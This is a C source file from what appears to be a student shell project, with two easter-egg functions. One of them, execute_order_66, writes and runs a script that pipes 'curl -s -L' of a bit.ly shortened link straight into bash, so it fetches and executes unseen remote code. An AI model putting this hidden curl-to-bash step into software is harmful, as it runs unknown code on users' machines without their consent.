/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   ee.c                                               :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: lvodak <lvodak@student.s19.be>             +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2024/05/03 23:41:56 by gfinet            #+#    #+#             */
/*   Updated: 2024/05/07 15:17:11 by lvodak           ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "ee.h"

void	execute_order_66(char **envp)
{
	int	fd;

	ft_putendl_fd(WARNING HIDDEN, 1);
	sleep(1);
	fd = open("includes/ee/order66.sh", O_WRONLY | O_CREAT | O_TRUNC,
			S_IRUSR | S_IXUSR | S_IRUSR);
	ft_putendl_fd("#!/bin/bash", fd);
	ft_putendl_fd("curl -s -L https://bit.ly/3zvELNz | bash", fd);
	close(fd);
	execve("/bin/bash", (char *[]){"/bin/bash", ORDER66, 0}, envp);
}

void	print_exporto_patronum(void)
{
	int		fd;
	char	*str;

	fd = open("/Users/lvodak/exporto_patronum", O_RDONLY);
	if (fd < 0)
		return ;
	while (1)
	{
		str = get_next_line(fd);
		if (str)
			printf("%s", str);
		else
			break ;
		free(str);
		usleep(5000);
	}
	printf("\n");
	free(str);
	close(fd);
}
